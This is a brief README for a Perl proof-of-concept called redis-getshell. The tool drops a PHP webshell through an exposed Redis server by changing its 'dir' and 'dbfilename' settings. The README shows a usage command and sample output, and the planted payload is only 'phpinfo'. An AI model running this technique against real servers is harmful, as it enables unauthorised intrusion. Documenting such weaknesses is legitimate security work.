## redis-getshell

The script below demonstrates the possibility to dump a webshell through a redis server

## usage

<pre>
%> ./redis-getshell.pl --host 127.0.0.1 --port 6379 --path /tmp/ooo.php
[+] Connection established 127.0.0.1:6379
[+] Receiving old dbfilename value
[+] Receiving old dir value
[+] Alternating configuration
    -> dir /tmp
    -> dbfilename ooo.php
    -> webshell <?php phpinfo (); ?>
[+] Restoring configuration
</pre>
